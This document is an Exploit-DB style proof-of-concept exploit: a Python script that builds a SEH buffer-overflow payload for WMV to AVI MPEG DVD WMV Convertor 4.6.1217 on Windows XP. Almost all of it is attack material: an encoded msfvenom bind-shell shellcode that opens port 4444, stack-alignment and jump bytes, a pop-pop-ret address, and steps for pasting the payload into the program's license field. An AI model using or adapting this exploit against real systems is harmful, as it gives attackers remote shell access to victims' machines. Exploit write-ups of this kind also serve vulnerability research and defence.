# Exploit Title: WMV to AVI MPEG DVD WMV Convertor 4.6.1217 - Buffer OverFlow (SEH)
# Google Dork: N/A
# Date: 2019-10-30
# Exploit Author: Doan Nguyen (4ll4u)
# Vendor Homepage:https://www.alloksoft.com/
# Software Link:  https://www.alloksoft.com/wmv.htm
# Version: v4.6.1217
# Tested on: Windows XP SP3
# CVE : N/A
# Reference from : [1] https://www.exploit-db.com/exploits/47563        

# 1.- Run python code :poc.py
# 2.- Open EVIL.txt and copy content to clipboard
# 3.- Open  WMV to AVI MPEG DVD WMV Convertor and Click 'EnterKey'
# 4.- Paste the content of EVIL.txt into the Field: 'License Name and License Code'
# 5.- Click 'OK' and you will get a bind shell on port 4444

#msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -b '\x00' -f hex
#We need to create meaningful characters when pasting into the password on the application (allow characters include:\x21->\x7E in ASCII TABLE)
shellcode = (
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x53\x2A\x52\x25\x2D\x53\x2A\x52\x25\x2D\x55\x2A\x52\x25\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x23\x34\x4D\x68\x2D\x23\x34\x4D\x68\x2D\x24\x36\x4D\x69\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x62\x5C\x30\x75\x2D\x62\x5C\x30\x75\x2D\x62\x5E\x31\x75\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x60\x73\x71\x3B\x2D\x60\x73\x71\x3B\x2D\x61\x75\x73\x3D\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x4B\x39\x6F\x40\x2D\x4B\x39\x6F\x40\x2D\x4C\x39\x70\x40\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x62\x47\x44\x27\x2D\x62\x47\x44\x27\x2D\x63\x47\x45\x27\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x38\x49\x2A\x35\x2D\x38\x49\x2A\x35\x2D\x38\x49\x2A\x36\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x5D\x71\x68\x26\x2D\x5D\x71\x68\x26\x2D\x5D\x71\x6A\x28\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x47\x21\x25\x28\x2D\x47\x21\x25\x28\x2D\x49\x22\x27\x29\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x44\x56\x34\x3C\x2D\x44\x56\x34\x3C\x2D\x45\x58\x35\x3C\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x57\x31\x33\x44\x2D\x57\x31\x33\x44\x2D\x58\x32\x34\x45\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3C\x6E\x4F\x50\x2D\x3C\x6E\x4F\x50\x2D\x3E\x70\x50\x52\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3F\x38\x33\x5F\x2D\x3F\x38\x33\x5F\x2D\x40\x39\x33\x60\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6F\x4D\x38\x22\x2D\x6F\x4D\x38\x22\x2D\x6F\x4F\x3A\x24\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x62\x72\x56\x55\x2D\x62\x72\x56\x55\x2D\x63\x74\x58\x55\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x4B\x66\x52\x53\x2D\x4B\x66\x52\x53\x2D\x4C\x67\x52\x54\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3B\x22\x35\x71\x2D\x3B\x22\x35\x71\x2D\x3C\x22\x37\x72\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x2E\x4F\x64\x55\x2D\x2E\x4F\x64\x55\x2D\x2E\x51\x65\x55\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x59\x48\x59\x5A\x2D\x59\x48\x59\x5A\x2D\x5B\x4A\x59\x5B\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x49\x62\x5C\x5A\x2D\x49\x62\x5C\x5A\x2D\x4A\x64\x5C\x5C\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x63\x54\x2A\x47\x2D\x63\x54\x2A\x47\x2D\x65\x55\x2A\x47\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x48\x4D\x4D\x43\x2D\x48\x4D\x4D\x43\x2D\x49\x4F\x4E\x45\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x30\x75\x60\x3A\x2D\x30\x75\x60\x3A\x2D\x32\x75\x60\x3A\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x60\x6B\x3F\x52\x2D\x60\x6B\x3F\x52\x2D\x60\x6D\x40\x54\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3F\x47\x21\x58\x2D\x3F\x47\x21\x58\x2D\x3F\x49\x22\x58\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x65\x4E\x25\x4A\x2D\x65\x4E\x25\x4A\x2D\x65\x4E\x27\x4C\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3E\x35\x60\x46\x2D\x3E\x35\x60\x46\x2D\x3E\x37\x60\x46\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x45\x2E\x2D\x41\x2D\x45\x2E\x2D\x41\x2D\x45\x30\x2E\x42\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6C\x4B\x74\x4C\x2D\x6C\x4B\x74\x4C\x2D\x6E\x4C\x74\x4C\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x42\x43\x29\x26\x2D\x42\x43\x29\x26\x2D\x43\x43\x2A\x27\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x2F\x61\x43\x34\x2D\x2F\x61\x43\x34\x2D\x31\x61\x45\x34\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x50\x58\x4B\x69\x2D\x50\x58\x4B\x69\x2D\x52\x59\x4D\x6A\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x71\x29\x29\x39\x2D\x71\x29\x29\x39\x2D\x73\x2B\x2A\x39\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x54\x68\x52\x6D\x2D\x54\x68\x52\x6D\x2D\x55\x68\x52\x6D\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x20\x3C\x5B\x64\x2D\x20\x3C\x5B\x64\x2D\x21\x3E\x5B\x66\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x58\x6E\x65\x6B\x2D\x58\x6E\x65\x6B\x2D\x5A\x6F\x67\x6B\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x69\x26\x52\x23\x2D\x69\x26\x52\x23\x2D\x69\x27\x54\x25\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x46\x3F\x27\x71\x2D\x46\x3F\x27\x71\x2D\x48\x40\x29\x72\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3C\x24\x52\x54\x2D\x3C\x24\x52\x54\x2D\x3E\x26\x54\x54\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x5C\x40\x4F\x55\x2D\x5C\x40\x4F\x55\x2D\x5D\x40\x51\x57\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6A\x5C\x33\x58\x2D\x6A\x5C\x33\x58\x2D\x6A\x5C\x34\x59\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x5F\x3E\x5A\x5D\x2D\x5F\x3E\x5A\x5D\x2D\x5F\x40\x5C\x5E\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x49\x4D\x6A\x3B\x2D\x49\x4D\x6A\x3B\x2D\x4A\x4F\x6C\x3C\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x62\x23\x6B\x3D\x2D\x62\x23\x6B\x3D\x2D\x63\x23\x6B\x3F\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x23\x6A\x57\x67\x2D\x23\x6A\x57\x67\x2D\x24\x6C\x57\x67\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x23\x43\x60\x50\x2D\x23\x43\x60\x50\x2D\x25\x43\x60\x50\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x73\x31\x34\x2A\x2D\x73\x31\x34\x2A\x2D\x73\x33\x34\x2B\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x38\x56\x63\x59\x2D\x38\x56\x63\x59\x2D\x39\x56\x65\x59\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x40\x52\x60\x66\x2D\x40\x52\x60\x66\x2D\x41\x53\x61\x67\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x24\x61\x73\x2A\x2D\x24\x61\x73\x2A\x2D\x26\x61\x75\x2A\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x48\x34\x53\x66\x2D\x48\x34\x53\x66\x2D\x48\x34\x54\x68\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3C\x26\x57\x26\x2D\x3C\x26\x57\x26\x2D\x3C\x27\x58\x27\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x54\x63\x3A\x27\x2D\x54\x63\x3A\x27\x2D\x54\x63\x3A\x27\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x26\x26\x2F\x50\x2D\x26\x26\x2F\x50\x2D\x27\x27\x2F\x51\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x30\x52\x2E\x62\x2D\x30\x52\x2E\x62\x2D\x30\x54\x30\x63\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x31\x5A\x75\x73\x2D\x31\x5A\x75\x73\x2D\x32\x5B\x75\x75\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x36\x41\x66\x56\x2D\x36\x41\x66\x56\x2D\x36\x42\x68\x57\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x36\x63\x50\x32\x2D\x36\x63\x50\x32\x2D\x36\x63\x51\x33\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x59\x4B\x23\x26\x2D\x59\x4B\x23\x26\x2D\x5A\x4C\x24\x27\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x28\x68\x4A\x4D\x2D\x28\x68\x4A\x4D\x2D\x2A\x69\x4B\x4F\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x2E\x41\x53\x6A\x2D\x2E\x41\x53\x6A\x2D\x30\x42\x55\x6A\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6F\x6A\x2F\x6D\x2D\x6F\x6A\x2F\x6D\x2D\x6F\x6A\x2F\x6E\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x2C\x44\x30\x30\x2D\x2C\x44\x30\x30\x2D\x2D\x46\x30\x31\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x4A\x67\x69\x4F\x2D\x4A\x67\x69\x4F\x2D\x4A\x69\x69\x51\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x65\x44\x45\x68\x2D\x65\x44\x45\x68\x2D\x66\x44\x45\x6A\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6F\x57\x32\x45\x2D\x6F\x57\x32\x45\x2D\x6F\x59\x34\x47\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x35\x2C\x45\x43\x2D\x35\x2C\x45\x43\x2D\x37\x2C\x46\x45\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x69\x4A\x5A\x6D\x2D\x69\x4A\x5A\x6D\x2D\x6A\x4A\x5C\x6F\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x2F\x54\x6B\x5E\x2D\x2F\x54\x6B\x5E\x2D\x2F\x56\x6B\x60\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x40\x25\x6E\x55\x2D\x40\x25\x6E\x55\x2D\x41\x26\x6E\x57\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x52\x6F\x33\x2D\x2D\x52\x6F\x33\x2D\x2D\x52\x70\x33\x2F\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3A\x6E\x6D\x3D\x2D\x3A\x6E\x6D\x3D\x2D\x3B\x6E\x6E\x3E\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x4E\x3D\x41\x4F\x2D\x4E\x3D\x41\x4F\x2D\x4F\x3D\x42\x4F\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x49\x28\x48\x64\x2D\x49\x28\x48\x64\x2D\x4A\x28\x49\x64\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x73\x2E\x5A\x59\x2D\x73\x2E\x5A\x59\x2D\x74\x2E\x5A\x59\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x4E\x68\x29\x3A\x2D\x4E\x68\x29\x3A\x2D\x4F\x68\x2B\x3B\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x21\x32\x38\x36\x2D\x21\x32\x38\x36\x2D\x22\x32\x38\x36\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x53\x4C\x2B\x47\x2D\x53\x4C\x2B\x47\x2D\x54\x4C\x2B\x47\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x5C\x2F\x47\x6B\x2D\x5C\x2F\x47\x6B\x2D\x5E\x31\x47\x6B\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x6D\x35\x37\x5C\x2D\x6D\x35\x37\x5C\x2D\x6D\x35\x39\x5D\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x28\x35\x41\x22\x2D\x28\x35\x41\x22\x2D\x28\x36\x43\x22\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x2D\x40\x6F\x2B\x2D\x2D\x40\x6F\x2B\x2D\x2F\x41\x6F\x2C\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x20\x42\x3C\x2B\x2D\x20\x42\x3C\x2B\x2D\x21\x43\x3E\x2D\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x3F\x4E\x54\x2B\x2D\x3F\x4E\x54\x2B\x2D\x3F\x50\x54\x2B\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x29\x69\x53\x44\x2D\x29\x69\x53\x44\x2D\x2B\x6A\x54\x46\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x62\x6B\x6F\x39\x2D\x62\x6B\x6F\x39\x2D\x62\x6C\x6F\x39\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x67\x6C\x40\x26\x2D\x67\x6C\x40\x26\x2D\x69\x6E\x41\x27\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x49\x59\x36\x44\x2D\x49\x59\x36\x44\x2D\x4A\x59\x37\x46\x50\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x61\x68\x61\x2E\x2D\x61\x68\x61\x2E\x2D\x61\x68\x63\x2E\x50"
"\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A\x2D\x70\x6f\x6f\x6f\x50\x50\x50" # push 12 NOP 
)

alignment = "\x54\x58\x2d\x54\x54\x54\x54\x2d\x37\x63\x54\x54\x2d\x25\x31\x57\x57\x50\x5C" # stack alignment 001292C0 - 0012AA10
jump_short = "\x90\x90\xEB\x08"  # jump to 00129A44
pop_pop_ret ="\x09\x9a\x01\x10" # pop pop ret in SkinMagic.dll
buffer = "\x41" * 780 + jump_short + pop_pop_ret + "\x41\x41\x41\x41" + alignment + shellcode + (6000 - 780 - 4 - 4 - len(shellcode) - len(alignment)) * "\x45"

try:
    f=open("shell.txt","w")
    print "[+] Creating %s bytes evil payload.." %len(buffer)
    f.write(buffer)
    f.close()
    print "[+] File created!"
except:
    print "File cannot be created"